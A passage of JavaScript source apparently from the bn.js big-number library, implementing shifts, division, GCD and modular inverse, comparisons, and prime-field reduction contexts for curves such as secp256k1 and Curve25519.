BN.prototype.ishln = function ishln (bits) {\n    // TODO(indutny): implement me\n    assert(this.negative === 0);\n    return this.iushln(bits);\n  };\n\n  // Shift-right in-place\n  // NOTE: `hint` is a lowest bit before trailing zeroes\n  // NOTE: if `extended` is present - it will be filled with destroyed bits\n  BN.prototype.iushrn = function iushrn (bits, hint, extended) {\n    assert(typeof bits === 'number' && bits >= 0);\n    var h;\n    if (hint) {\n      h = (hint - (hint % 26)) / 26;\n    } else {\n      h = 0;\n    }\n\n    var r = bits % 26;\n    var s = Math.min((bits - r) / 26, this.length);\n    var mask = 0x3ffffff ^ ((0x3ffffff >>> r) << r);\n    var maskedWords = extended;\n\n    h -= s;\n    h = Math.max(0, h);\n\n    // Extended mode, copy masked part\n    if (maskedWords) {\n      for (var i = 0; i < s; i++) {\n        maskedWords.words[i] = this.words[i];\n      }\n      maskedWords.length = s;\n    }\n\n    if (s === 0) {\n      // No-op, we should not move anything at all\n    } else if (this.length > s) {\n      this.length -= s;\n      for (i = 0; i < this.length; i++) {\n        this.words[i] = this.words[i + s];\n      }\n    } else {\n      this.words[0] = 0;\n      this.length = 1;\n    }\n\n    var carry = 0;\n    for (i = this.length - 1; i >= 0 && (carry !== 0 || i >= h); i--) {\n      var word = this.words[i] | 0;\n      this.words[i] = (carry << (26 - r)) | (word >>> r);\n      carry = word & mask;\n    }\n\n    // Push carried bits as a mask\n    if (maskedWords && carry !== 0) {\n      maskedWords.words[maskedWords.length++] = carry;\n    }\n\n    if (this.length === 0) {\n      this.words[0] = 0;\n      this.length = 1;\n    }\n\n    return this._strip();\n  };\n\n  BN.prototype.ishrn = function ishrn (bits, hint, extended) {\n    // TODO(indutny): implement me\n    assert(this.negative === 0);\n    return this.iushrn(bits, hint, extended);\n  };\n\n  // Shift-left\n  BN.prototype.shln = function shln (bits) {\n    return this.clone().ishln(bits);\n  };\n\n  BN.prototype.ushln = function ushln (bits) {\n    return this.clone().iushln(bits);\n  };\n\n  // Shift-right\n  BN.prototype.shrn = function shrn (bits) {\n    return this.clone().ishrn(bits);\n  };\n\n  BN.prototype.ushrn = function ushrn (bits) {\n    return this.clone().iushrn(bits);\n  };\n\n  // Test if n bit is set\n  BN.prototype.testn = function testn (bit) {\n    assert(typeof bit === 'number' && bit >= 0);\n    var r = bit % 26;\n    var s = (bit - r) / 26;\n    var q = 1 << r;\n\n    // Fast case: bit is much higher than all existing words\n    if (this.length <= s) return false;\n\n    // Check bit and return\n    var w = this.words[s];\n\n    return !!(w & q);\n  };\n\n  // Return only lowers bits of number (in-place)\n  BN.prototype.imaskn = function imaskn (bits) {\n    assert(typeof bits === 'number' && bits >= 0);\n    var r = bits % 26;\n    var s = (bits - r) / 26;\n\n    assert(this.negative === 0, 'imaskn works only with positive numbers');\n\n    if (this.length <= s) {\n      return this;\n    }\n\n    if (r !== 0) {\n      s++;\n    }\n    this.length = Math.min(s, this.length);\n\n    if (r !== 0) {\n      var mask = 0x3ffffff ^ ((0x3ffffff >>> r) << r);\n      this.words[this.length - 1] &= mask;\n    }\n\n    return this._strip();\n  };\n\n  // Return only lowers bits of number\n  BN.prototype.maskn = function maskn (bits) {\n    return this.clone().imaskn(bits);\n  };\n\n  // Add plain number `num` to `this`\n  BN.prototype.iaddn = function iaddn (num) {\n    assert(typeof num === 'number');\n    assert(num < 0x4000000);\n    if (num < 0) return this.isubn(-num);\n\n    // Possible sign change\n    if (this.negative !== 0) {\n      if (this.length === 1 && (this.words[0] | 0) <= num) {\n        this.words[0] = num - (this.words[0] | 0);\n        this.negative = 0;\n        return this;\n      }\n\n      this.negative = 0;\n      this.isubn(num);\n      this.negative = 1;\n      return this;\n    }\n\n    // Add without checks\n    return this._iaddn(num);\n  };\n\n  BN.prototype._iaddn = function _iaddn (num) {\n    this.words[0] += num;\n\n    // Carry\n    for (var i = 0; i < this.length && this.words[i] >= 0x4000000; i++) {\n      this.words[i] -= 0x4000000;\n      if (i === this.length - 1) {\n        this.words[i + 1] = 1;\n      } else {\n        this.words[i + 1]++;\n      }\n    }\n    this.length = Math.max(this.length, i + 1);\n\n    return this;\n  };\n\n  // Subtract plain number `num` from `this`\n  BN.prototype.isubn = function isubn (num) {\n    assert(typeof num === 'number');\n    assert(num < 0x4000000);\n    if (num < 0) return this.iaddn(-num);\n\n    if (this.negative !== 0) {\n      this.negative = 0;\n      this.iaddn(num);\n      this.negative = 1;\n      return this;\n    }\n\n    this.words[0] -= num;\n\n    if (this.length === 1 && this.words[0] < 0) {\n      this.words[0] = -this.words[0];\n      this.negative = 1;\n    } else {\n      // Carry\n      for (var i = 0; i < this.length && this.words[i] < 0; i++) {\n        this.words[i] += 0x4000000;\n        this.words[i + 1] -= 1;\n      }\n    }\n\n    return this._strip();\n  };\n\n  BN.prototype.addn = function addn (num) {\n    return this.clone().iaddn(num);\n  };\n\n  BN.prototype.subn = function subn (num) {\n    return this.clone().isubn(num);\n  };\n\n  BN.prototype.iabs = function iabs () {\n    this.negative = 0;\n\n    return this;\n  };\n\n  BN.prototype.abs = function abs () {\n    return this.clone().iabs();\n  };\n\n  BN.prototype._ishlnsubmul = function _ishlnsubmul (num, mul, shift) {\n    var len = num.length + shift;\n    var i;\n\n    this._expand(len);\n\n    var w;\n    var carry = 0;\n    for (i = 0; i < num.length; i++) {\n      w = (this.words[i + shift] | 0) + carry;\n      var right = (num.words[i] | 0) * mul;\n      w -= right & 0x3ffffff;\n      carry = (w >> 26) - ((right / 0x4000000) | 0);\n      this.words[i + shift] = w & 0x3ffffff;\n    }\n    for (; i < this.length - shift; i++) {\n      w = (this.words[i + shift] | 0) + carry;\n      carry = w >> 26;\n      this.words[i + shift] = w & 0x3ffffff;\n    }\n\n    if (carry === 0) return this._strip();\n\n    // Subtraction overflow\n    assert(carry === -1);\n    carry = 0;\n    for (i = 0; i < this.length; i++) {\n      w = -(this.words[i] | 0) + carry;\n      carry = w >> 26;\n      this.words[i] = w & 0x3ffffff;\n    }\n    this.negative = 1;\n\n    return this._strip();\n  };\n\n  BN.prototype._wordDiv = function _wordDiv (num, mode) {\n    var shift = this.length - num.length;\n\n    var a = this.clone();\n    var b = num;\n\n    // Normalize\n    var bhi = b.words[b.length - 1] | 0;\n    var bhiBits = this._countBits(bhi);\n    shift = 26 - bhiBits;\n    if (shift !== 0) {\n      b = b.ushln(shift);\n      a.iushln(shift);\n      bhi = b.words[b.length - 1] | 0;\n    }\n\n    // Initialize quotient\n    var m = a.length - b.length;\n    var q;\n\n    if (mode !== 'mod') {\n      q = new BN(null);\n      q.length = m + 1;\n      q.words = new Array(q.length);\n      for (var i = 0; i < q.length; i++) {\n        q.words[i] = 0;\n      }\n    }\n\n    var diff = a.clone()._ishlnsubmul(b, 1, m);\n    if (diff.negative === 0) {\n      a = diff;\n      if (q) {\n        q.words[m] = 1;\n      }\n    }\n\n    for (var j = m - 1; j >= 0; j--) {\n      var qj = (a.words[b.length + j] | 0) * 0x4000000 +\n        (a.words[b.length + j - 1] | 0);\n\n      // NOTE: (qj / bhi) is (0x3ffffff * 0x4000000 + 0x3ffffff) / 0x2000000 max\n      // (0x7ffffff)\n      qj = Math.min((qj / bhi) | 0, 0x3ffffff);\n\n      a._ishlnsubmul(b, qj, j);\n      while (a.negative !== 0) {\n        qj--;\n        a.negative = 0;\n        a._ishlnsubmul(b, 1, j);\n        if (!a.isZero()) {\n          a.negative ^= 1;\n        }\n      }\n      if (q) {\n        q.words[j] = qj;\n      }\n    }\n    if (q) {\n      q._strip();\n    }\n    a._strip();\n\n    // Denormalize\n    if (mode !== 'div' && shift !== 0) {\n      a.iushrn(shift);\n    }\n\n    return {\n      div: q || null,\n      mod: a\n    };\n  };\n\n  // NOTE: 1) `mode` can be set to `mod` to request mod only,\n  //       to `div` to request div only, or be absent to\n  //       request both div & mod\n  //       2) `positive` is true if unsigned mod is requested\n  BN.prototype.divmod = function divmod (num, mode, positive) {\n    assert(!num.isZero());\n\n    if (this.isZero()) {\n      return {\n        div: new BN(0),\n        mod: new BN(0)\n      };\n    }\n\n    var div, mod, res;\n    if (this.negative !== 0 && num.negative === 0) {\n      res = this.neg().divmod(num, mode);\n\n      if (mode !== 'mod') {\n        div = res.div.neg();\n      }\n\n      if (mode !== 'div') {\n        mod = res.mod.neg();\n        if (positive && mod.negative !== 0) {\n          mod.iadd(num);\n        }\n      }\n\n      return {\n        div: div,\n        mod: mod\n      };\n    }\n\n    if (this.negative === 0 && num.negative !== 0) {\n      res = this.divmod(num.neg(), mode);\n\n      if (mode !== 'mod') {\n        div = res.div.neg();\n      }\n\n      return {\n        div: div,\n        mod: res.mod\n      };\n    }\n\n    if ((this.negative & num.negative) !== 0) {\n      res = this.neg().divmod(num.neg(), mode);\n\n      if (mode !== 'div') {\n        mod = res.mod.neg();\n        if (positive && mod.negative !== 0) {\n          mod.isub(num);\n        }\n      }\n\n      return {\n        div: res.div,\n        mod: mod\n      };\n    }\n\n    // Both numbers are positive at this point\n\n    // Strip both numbers to approximate shift value\n    if (num.length > this.length || this.cmp(num) < 0) {\n      return {\n        div: new BN(0),\n        mod: this\n      };\n    }\n\n    // Very short reduction\n    if (num.length === 1) {\n      if (mode === 'div') {\n        return {\n          div: this.divn(num.words[0]),\n          mod: null\n        };\n      }\n\n      if (mode === 'mod') {\n        return {\n          div: null,\n          mod: new BN(this.modrn(num.words[0]))\n        };\n      }\n\n      return {\n        div: this.divn(num.words[0]),\n        mod: new BN(this.modrn(num.words[0]))\n      };\n    }\n\n    return this._wordDiv(num, mode);\n  };\n\n  // Find `this` / `num`\n  BN.prototype.div = function div (num) {\n    return this.divmod(num, 'div', false).div;\n  };\n\n  // Find `this` % `num`\n  BN.prototype.mod = function mod (num) {\n    return this.divmod(num, 'mod', false).mod;\n  };\n\n  BN.prototype.umod = function umod (num) {\n    return this.divmod(num, 'mod', true).mod;\n  };\n\n  // Find Round(`this` / `num`)\n  BN.prototype.divRound = function divRound (num) {\n    var dm = this.divmod(num);\n\n    // Fast case - exact division\n    if (dm.mod.isZero()) return dm.div;\n\n    var mod = dm.div.negative !== 0 ? dm.mod.isub(num) : dm.mod;\n\n    var half = num.ushrn(1);\n    var r2 = num.andln(1);\n    var cmp = mod.cmp(half);\n\n    // Round down\n    if (cmp < 0 || (r2 === 1 && cmp === 0)) return dm.div;\n\n    // Round up\n    return dm.div.negative !== 0 ? dm.div.isubn(1) : dm.div.iaddn(1);\n  };\n\n  BN.prototype.modrn = function modrn (num) {\n    var isNegNum = num < 0;\n    if (isNegNum) num = -num;\n\n    assert(num <= 0x3ffffff);\n    var p = (1 << 26) % num;\n\n    var acc = 0;\n    for (var i = this.length - 1; i >= 0; i--) {\n      acc = (p * acc + (this.words[i] | 0)) % num;\n    }\n\n    return isNegNum ? -acc : acc;\n  };\n\n  // WARNING: DEPRECATED\n  BN.prototype.modn = function modn (num) {\n    return this.modrn(num);\n  };\n\n  // In-place division by number\n  BN.prototype.idivn = function idivn (num) {\n    var isNegNum = num < 0;\n    if (isNegNum) num = -num;\n\n    assert(num <= 0x3ffffff);\n\n    var carry = 0;\n    for (var i = this.length - 1; i >= 0; i--) {\n      var w = (this.words[i] | 0) + carry * 0x4000000;\n      this.words[i] = (w / num) | 0;\n      carry = w % num;\n    }\n\n    this._strip();\n    return isNegNum ? this.ineg() : this;\n  };\n\n  BN.prototype.divn = function divn (num) {\n    return this.clone().idivn(num);\n  };\n\n  BN.prototype.egcd = function egcd (p) {\n    assert(p.negative === 0);\n    assert(!p.isZero());\n\n    var x = this;\n    var y = p.clone();\n\n    if (x.negative !== 0) {\n      x = x.umod(p);\n    } else {\n      x = x.clone();\n    }\n\n    // A * x + B * y = x\n    var A = new BN(1);\n    var B = new BN(0);\n\n    // C * x + D * y = y\n    var C = new BN(0);\n    var D = new BN(1);\n\n    var g = 0;\n\n    while (x.isEven() && y.isEven()) {\n      x.iushrn(1);\n      y.iushrn(1);\n      ++g;\n    }\n\n    var yp = y.clone();\n    var xp = x.clone();\n\n    while (!x.isZero()) {\n      for (var i = 0, im = 1; (x.words[0] & im) === 0 && i < 26; ++i, im <<= 1);\n      if (i > 0) {\n        x.iushrn(i);\n        while (i-- > 0) {\n          if (A.isOdd() || B.isOdd()) {\n            A.iadd(yp);\n            B.isub(xp);\n          }\n\n          A.iushrn(1);\n          B.iushrn(1);\n        }\n      }\n\n      for (var j = 0, jm = 1; (y.words[0] & jm) === 0 && j < 26; ++j, jm <<= 1);\n      if (j > 0) {\n        y.iushrn(j);\n        while (j-- > 0) {\n          if (C.isOdd() || D.isOdd()) {\n            C.iadd(yp);\n            D.isub(xp);\n          }\n\n          C.iushrn(1);\n          D.iushrn(1);\n        }\n      }\n\n      if (x.cmp(y) >= 0) {\n        x.isub(y);\n        A.isub(C);\n        B.isub(D);\n      } else {\n        y.isub(x);\n        C.isub(A);\n        D.isub(B);\n      }\n    }\n\n    return {\n      a: C,\n      b: D,\n      gcd: y.iushln(g)\n    };\n  };\n\n  // This is reduced incarnation of the binary EEA\n  // above, designated to invert members of the\n  // _prime_ fields F(p) at a maximal speed\n  BN.prototype._invmp = function _invmp (p) {\n    assert(p.negative === 0);\n    assert(!p.isZero());\n\n    var a = this;\n    var b = p.clone();\n\n    if (a.negative !== 0) {\n      a = a.umod(p);\n    } else {\n      a = a.clone();\n    }\n\n    var x1 = new BN(1);\n    var x2 = new BN(0);\n\n    var delta = b.clone();\n\n    while (a.cmpn(1) > 0 && b.cmpn(1) > 0) {\n      for (var i = 0, im = 1; (a.words[0] & im) === 0 && i < 26; ++i, im <<= 1);\n      if (i > 0) {\n        a.iushrn(i);\n        while (i-- > 0) {\n          if (x1.isOdd()) {\n            x1.iadd(delta);\n          }\n\n          x1.iushrn(1);\n        }\n      }\n\n      for (var j = 0, jm = 1; (b.words[0] & jm) === 0 && j < 26; ++j, jm <<= 1);\n      if (j > 0) {\n        b.iushrn(j);\n        while (j-- > 0) {\n          if (x2.isOdd()) {\n            x2.iadd(delta);\n          }\n\n          x2.iushrn(1);\n        }\n      }\n\n      if (a.cmp(b) >= 0) {\n        a.isub(b);\n        x1.isub(x2);\n      } else {\n        b.isub(a);\n        x2.isub(x1);\n      }\n    }\n\n    var res;\n    if (a.cmpn(1) === 0) {\n      res = x1;\n    } else {\n      res = x2;\n    }\n\n    if (res.cmpn(0) < 0) {\n      res.iadd(p);\n    }\n\n    return res;\n  };\n\n  BN.prototype.gcd = function gcd (num) {\n    if (this.isZero()) return num.abs();\n    if (num.isZero()) return this.abs();\n\n    var a = this.clone();\n    var b = num.clone();\n    a.negative = 0;\n    b.negative = 0;\n\n    // Remove common factor of two\n    for (var shift = 0; a.isEven() && b.isEven(); shift++) {\n      a.iushrn(1);\n      b.iushrn(1);\n    }\n\n    do {\n      while (a.isEven()) {\n        a.iushrn(1);\n      }\n      while (b.isEven()) {\n        b.iushrn(1);\n      }\n\n      var r = a.cmp(b);\n      if (r < 0) {\n        // Swap `a` and `b` to make `a` always bigger than `b`\n        var t = a;\n        a = b;\n        b = t;\n      } else if (r === 0 || b.cmpn(1) === 0) {\n        break;\n      }\n\n      a.isub(b);\n    } while (true);\n\n    return b.iushln(shift);\n  };\n\n  // Invert number in the field F(num)\n  BN.prototype.invm = function invm (num) {\n    return this.egcd(num).a.umod(num);\n  };\n\n  BN.prototype.isEven = function isEven () {\n    return (this.words[0] & 1) === 0;\n  };\n\n  BN.prototype.isOdd = function isOdd () {\n    return (this.words[0] & 1) === 1;\n  };\n\n  // And first word and num\n  BN.prototype.andln = function andln (num) {\n    return this.words[0] & num;\n  };\n\n  // Increment at the bit position in-line\n  BN.prototype.bincn = function bincn (bit) {\n    assert(typeof bit === 'number');\n    var r = bit % 26;\n    var s = (bit - r) / 26;\n    var q = 1 << r;\n\n    // Fast case: bit is much higher than all existing words\n    if (this.length <= s) {\n      this._expand(s + 1);\n      this.words[s] |= q;\n      return this;\n    }\n\n    // Add bit and propagate, if needed\n    var carry = q;\n    for (var i = s; carry !== 0 && i < this.length; i++) {\n      var w = this.words[i] | 0;\n      w += carry;\n      carry = w >>> 26;\n      w &= 0x3ffffff;\n      this.words[i] = w;\n    }\n    if (carry !== 0) {\n      this.words[i] = carry;\n      this.length++;\n    }\n    return this;\n  };\n\n  BN.prototype.isZero = function isZero () {\n    return this.length === 1 && this.words[0] === 0;\n  };\n\n  BN.prototype.cmpn = function cmpn (num) {\n    var negative = num < 0;\n\n    if (this.negative !== 0 && !negative) return -1;\n    if (this.negative === 0 && negative) return 1;\n\n    this._strip();\n\n    var res;\n    if (this.length > 1) {\n      res = 1;\n    } else {\n      if (negative) {\n        num = -num;\n      }\n\n      assert(num <= 0x3ffffff, 'Number is too big');\n\n      var w = this.words[0] | 0;\n      res = w === num ? 0 : w < num ? -1 : 1;\n    }\n    if (this.negative !== 0) return -res | 0;\n    return res;\n  };\n\n  // Compare two numbers and return:\n  // 1 - if `this` > `num`\n  // 0 - if `this` == `num`\n  // -1 - if `this` < `num`\n  BN.prototype.cmp = function cmp (num) {\n    if (this.negative !== 0 && num.negative === 0) return -1;\n    if (this.negative === 0 && num.negative !== 0) return 1;\n\n    var res = this.ucmp(num);\n    if (this.negative !== 0) return -res | 0;\n    return res;\n  };\n\n  // Unsigned comparison\n  BN.prototype.ucmp = function ucmp (num) {\n    // At this point both numbers have the same sign\n    if (this.length > num.length) return 1;\n    if (this.length < num.length) return -1;\n\n    var res = 0;\n    for (var i = this.length - 1; i >= 0; i--) {\n      var a = this.words[i] | 0;\n      var b = num.words[i] | 0;\n\n      if (a === b) continue;\n      if (a < b) {\n        res = -1;\n      } else if (a > b) {\n        res = 1;\n      }\n      break;\n    }\n    return res;\n  };\n\n  BN.prototype.gtn = function gtn (num) {\n    return this.cmpn(num) === 1;\n  };\n\n  BN.prototype.gt = function gt (num) {\n    return this.cmp(num) === 1;\n  };\n\n  BN.prototype.gten = function gten (num) {\n    return this.cmpn(num) >= 0;\n  };\n\n  BN.prototype.gte = function gte (num) {\n    return this.cmp(num) >= 0;\n  };\n\n  BN.prototype.ltn = function ltn (num) {\n    return this.cmpn(num) === -1;\n  };\n\n  BN.prototype.lt = function lt (num) {\n    return this.cmp(num) === -1;\n  };\n\n  BN.prototype.lten = function lten (num) {\n    return this.cmpn(num) <= 0;\n  };\n\n  BN.prototype.lte = function lte (num) {\n    return this.cmp(num) <= 0;\n  };\n\n  BN.prototype.eqn = function eqn (num) {\n    return this.cmpn(num) === 0;\n  };\n\n  BN.prototype.eq = function eq (num) {\n    return this.cmp(num) === 0;\n  };\n\n  //\n  // A reduce context, could be using montgomery or something better, depending\n  // on the `m` itself.\n  //\n  BN.red = function red (num) {\n    return new Red(num);\n  };\n\n  BN.prototype.toRed = function toRed (ctx) {\n    assert(!this.red, 'Already a number in reduction context');\n    assert(this.negative === 0, 'red works only with positives');\n    return ctx.convertTo(this)._forceRed(ctx);\n  };\n\n  BN.prototype.fromRed = function fromRed () {\n    assert(this.red, 'fromRed works only with numbers in reduction context');\n    return this.red.convertFrom(this);\n  };\n\n  BN.prototype._forceRed = function _forceRed (ctx) {\n    this.red = ctx;\n    return this;\n  };\n\n  BN.prototype.forceRed = function forceRed (ctx) {\n    assert(!this.red, 'Already a number in reduction context');\n    return this._forceRed(ctx);\n  };\n\n  BN.prototype.redAdd = function redAdd (num) {\n    assert(this.red, 'redAdd works only with red numbers');\n    return this.red.add(this, num);\n  };\n\n  BN.prototype.redIAdd = function redIAdd (num) {\n    assert(this.red, 'redIAdd works only with red numbers');\n    return this.red.iadd(this, num);\n  };\n\n  BN.prototype.redSub = function redSub (num) {\n    assert(this.red, 'redSub works only with red numbers');\n    return this.red.sub(this, num);\n  };\n\n  BN.prototype.redISub = function redISub (num) {\n    assert(this.red, 'redISub works only with red numbers');\n    return this.red.isub(this, num);\n  };\n\n  BN.prototype.redShl = function redShl (num) {\n    assert(this.red, 'redShl works only with red numbers');\n    return this.red.shl(this, num);\n  };\n\n  BN.prototype.redMul = function redMul (num) {\n    assert(this.red, 'redMul works only with red numbers');\n    this.red._verify2(this, num);\n    return this.red.mul(this, num);\n  };\n\n  BN.prototype.redIMul = function redIMul (num) {\n    assert(this.red, 'redMul works only with red numbers');\n    this.red._verify2(this, num);\n    return this.red.imul(this, num);\n  };\n\n  BN.prototype.redSqr = function redSqr () {\n    assert(this.red, 'redSqr works only with red numbers');\n    this.red._verify1(this);\n    return this.red.sqr(this);\n  };\n\n  BN.prototype.redISqr = function redISqr () {\n    assert(this.red, 'redISqr works only with red numbers');\n    this.red._verify1(this);\n    return this.red.isqr(this);\n  };\n\n  // Square root over p\n  BN.prototype.redSqrt = function redSqrt () {\n    assert(this.red, 'redSqrt works only with red numbers');\n    this.red._verify1(this);\n    return this.red.sqrt(this);\n  };\n\n  BN.prototype.redInvm = function redInvm () {\n    assert(this.red, 'redInvm works only with red numbers');\n    this.red._verify1(this);\n    return this.red.invm(this);\n  };\n\n  // Return negative clone of `this` % `red modulo`\n  BN.prototype.redNeg = function redNeg () {\n    assert(this.red, 'redNeg works only with red numbers');\n    this.red._verify1(this);\n    return this.red.neg(this);\n  };\n\n  BN.prototype.redPow = function redPow (num) {\n    assert(this.red && !num.red, 'redPow(normalNum)');\n    this.red._verify1(this);\n    return this.red.pow(this, num);\n  };\n\n  // Prime numbers with efficient reduction\n  var primes = {\n    k256: null,\n    p224: null,\n    p192: null,\n    p25519: null\n  };\n\n  // Pseudo-Mersenne prime\n  function MPrime (name, p) {\n    // P = 2 ^ N - K\n    this.name = name;\n    this.p = new BN(p, 16);\n    this.n = this.p.bitLength();\n    this.k = new BN(1).iushln(this.n).isub(this.p);\n\n    this.tmp = this._tmp();\n  }\n\n  MPrime.prototype._tmp = function _tmp () {\n    var tmp = new BN(null);\n    tmp.words = new Array(Math.ceil(this.n / 13));\n    return tmp;\n  };\n\n  MPrime.prototype.ireduce = function ireduce (num) {\n    // Assumes that `num` is less than `P^2`\n    // num = HI * (2 ^ N - K) + HI * K + LO = HI * K + LO (mod P)\n    var r = num;\n    var rlen;\n\n    do {\n      this.split(r, this.tmp);\n      r = this.imulK(r);\n      r = r.iadd(this.tmp);\n      rlen = r.bitLength();\n    } while (rlen > this.n);\n\n    var cmp = rlen < this.n ? -1 : r.ucmp(this.p);\n    if (cmp === 0) {\n      r.words[0] = 0;\n      r.length = 1;\n    } else if (cmp > 0) {\n      r.isub(this.p);\n    } else {\n      if (r.strip !== undefined) {\n        // r is a BN v4 instance\n        r.strip();\n      } else {\n        // r is a BN v5 instance\n        r._strip();\n      }\n    }\n\n    return r;\n  };\n\n  MPrime.prototype.split = function split (input, out) {\n    input.iushrn(this.n, 0, out);\n  };\n\n  MPrime.prototype.imulK = function imulK (num) {\n    return num.imul(this.k);\n  };\n\n  function K256 () {\n    MPrime.call(\n      this,\n      'k256',\n      'ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f');\n  }\n  inherits(K256, MPrime);\n\n  K256.prototype.split = function split (input, output) {\n    // 256 = 9 * 26 + 22\n    var mask = 0x3fffff;\n\n    var outLen = Math.min(input.length, 9);\n    for (var i = 0; i < outLen; i++) {\n      output.words[i] = input.words[i];\n    }\n    output.length = outLen;\n\n    if (input.length <= 9) {\n      input.words[0] = 0;\n      input.length = 1;\n      return;\n    }\n\n    // Shift by 9 limbs\n    var prev = input.words[9];\n    output.words[output.length++] = prev & mask;\n\n    for (i = 10; i < input.length; i++) {\n      var next = input.words[i] | 0;\n      input.words[i - 10] = ((next & mask) << 4) | (prev >>> 22);\n      prev = next;\n    }\n    prev >>>= 22;\n    input.words[i - 10] = prev;\n    if (prev === 0 && input.length > 10) {\n      input.length -= 10;\n    } else {\n      input.length -= 9;\n    }\n  };\n\n  K256.prototype.imulK = function imulK (num) {\n    // K = 0x1000003d1 = [ 0x40, 0x3d1 ]\n    num.words[num.length] = 0;\n    num.words[num.length + 1] = 0;\n    num.length += 2;\n\n    // bounded at: 0x40 * 0x3ffffff + 0x3d0 = 0x100000390\n    var lo = 0;\n    for (var i = 0; i < num.length; i++) {\n      var w = num.words[i] | 0;\n      lo += w * 0x3d1;\n      num.words[i] = lo & 0x3ffffff;\n      lo = w * 0x40 + ((lo / 0x4000000) | 0);\n    }\n\n    // Fast length reduction\n    if (num.words[num.length - 1] === 0) {\n      num.length--;\n      if (num.words[num.length - 1] === 0) {\n        num.length--;\n      }\n    }\n    return num;\n  };\n\n  function P224 () {\n    MPrime.call(\n      this,\n      'p224',\n      'ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001');\n  }\n  inherits(P224, MPrime);\n\n  function P192 () {\n    MPrime.call(\n      this,\n      'p192',\n      'ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff');\n  }\n  inherits(P192, MPrime);\n\n  function P25519 () {\n    // 2 ^ 255 - 19\n    MPrime.call(\n      this,\n      '25519',\n      '7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed');\n  }\n  inherits(P25519, MPrime);\n\n  P25519.prototype.imulK = function imulK (num) {\n    // K = 0x13\n    var carry = 0;\n    for (var i = 0; i < num.length; i++) {\n      var hi = (num.words[i] | 0) * 0x13 + carry;\n      var lo = hi & 0x3ffffff;\n      hi >>>= 26;\n\n      num.words[i] = lo;\n      carry = hi;\n    }\n    if (carry !== 0) {\n      num.words[num.length++] = carry;\n    }\n    return num;\n  };\n\n  // Exported mostly for testing purposes, use plain name instead\n  BN._prime = function prime (name) {\n    // Cached version of prime\n    if (primes[name]) return primes[name];\n\n    var prime;\n    if (name === 'k256') {\n      prime = new K256();\n    } else if (name === 'p224') {\n      prime = new P224();\n    } else if (name === 'p192') {\n      prime = new P192();\n    } else if (name === 'p25519') {\n      prime = new P25519();\n    } else {\n      throw new Error('Unknown prime ' + name);\n    }\n    primes[name] = prime;\n\n    return prime;\n  };\n\n  //\n  // Base reduction engine\n  //\n  function Red (m) {\n    if (typeof m === 'string') {\n      var prime = BN._prime(m);\n      this.m = prime.p;\n      this.prime = prime;\n    } else {\n      assert(m.gtn(1), 'modulus must be greater than 1');\n      this.m = m;\n      this.prime = null;\n    }\n  }\n\n  Red.prototype._verify1 = function _verify1 (a) {\n    assert(a.negative === 0, 'red works only with positives');\n    assert(a.red, 'red works only with red numbers');\n  };\n\n  Red.prototype._verify2 = function _verify2 (a, b) {\n    assert((a.negative | b.negative) === 0, 'red works only with positives');\n    assert(a.red && a.red === b.red,\n      'red works only with red numbers');\n  };\n\n  Red.prototype.imod = function imod (a) {\n    if (this.prime) return this.prime.ireduce(a)._forceRed(this);\n\n    move(a, a.umod(this.m)._forceRed(this));\n    return a;\n  };\n\n  Red.prototype.neg = function neg (a) {\n    if (a.isZero()) {\n      return a.clone();\n    }\n\n    return this.m.sub(a)._forceRed(this);\n  };\n\n  Red.prototype.add = function add (a, b) {\n    this._verify2(a, b);\n\n    var res = a.add(b);\n    if (res.cmp(this.m) >= 0) {\n      res.isub(this.m);\n    }\n    return res._forceRed(this);\n  };\n\n  Red.prototype.iadd = function iadd (a, b) {\n    this._verify2(a, b);\n\n    var res = a.iadd(b);\n    if (res.cmp(this.m) >= 0) {\n      res.isub(this.m);\n    }\n    return res;\n  };\n\n  Red.prototype.sub = function sub (a, b) {\n    this._verify2(a, b);\n\n    var res = a.sub(b);\n    if (res.cmpn(0) < 0) {\n      res.iadd(this.m);\n    }\n    return res._forceRed(this);\n  };\n\n  Red.prototype.isub = function isub (a, b) {\n    this._verify2(a, b);\n\n    var res = a.isub(b);\n    if (res.cmpn(0) < 0) {\n      res.iadd(this.m);\n    }\n    return res;\n  };\n\n  Red.prototype.shl = function shl (a, num) {\n    this._verify1(a);\n    return this.imod(a.ushln(num));\n  };\n\n  Red.prototype.imul = function imul (a, b) {\n    this._verify2(a, b);\n    return this.imod(a.imul(b));\n  };\n\n  Red.prototype.mul = function mul (a, b) {\n    this._verify2(a, b);\n    return this.imod(a.mul(b));\n  };\n\n  Red.prototype.isqr = function isqr (a) {\n    return this.imul(a, a.clone());\n  };\n\n  Red.prototype.sqr = function sqr (a) {\n    return this.mul(a, a);\n  };\n\n  Red.prototype.sqrt = function sqrt (a) {\n    if (a.isZero()) return a.clone();\n\n    var mod3 = this.m.andln(3);\n    assert(mod3 % 2 === 1);\n\n    // Fast case\n    if (mod3 === 3) {\n      var pow = this.m.add(new BN(1)).iushrn(2);\n      return this.pow(a, pow);\n    }\n\n    // Tonelli-Shanks algorithm (Totally unoptimized and slow)\n    //\n    // Find Q and S, that Q * 2 ^ S = (P - 1)\n    var q = this.m.subn(1);\n    var s = 0;\n    while (!q.isZero() && q.andln(1) === 0) {\n      s++;\n      q.iushrn(1);\n    }\n    assert(!q.isZero());\n\n    var one = new BN(1).toRed(this);\n    var nOne = one.redNeg();\n\n    // Find quadratic non-residue\n    // NOTE: Max is such because of generalized Riemann hypothesis.\n    var lpow = this.m.subn(1).iushrn(1);\n    var z = this.m.bitLength();\n    z = new BN(2 * z * z).toRed(this);\n\n    while (this.pow(z, lpow).cmp(nOne) !== 0) {\n      z.redIAdd(nOne);\n    }\n\n    var c = this.pow(z, q);\n    var r = this.pow(a, q.addn(1).iushrn(1));\n    var t = this.pow(a, q);\n    var m = s;\n    while (t.cmp(one) !== 0) {\n      var tmp = t;\n      for (var i = 0; tmp.cmp(one) !== 0; i++) {\n        tmp = tmp.redSqr();\n      }\n      assert(i < m);\n      var b = this.pow(c, new BN(1).iushln(m - i - 1));\n\n      r = r.redMul(b);\n      c = b.redSqr();\n      t = t.redMul(c);\n      m = i;\n    }\n\n    return r;\n  };\n\n  Red.prototype.invm = function invm (a) {\n    var inv = a._invmp(this.m);\n    if (inv.negative !== 0) {\n      inv.negative = 0;\n      return this.imod(inv).redNeg();\n    } else {\n      return this.imod(inv);\n    }\n  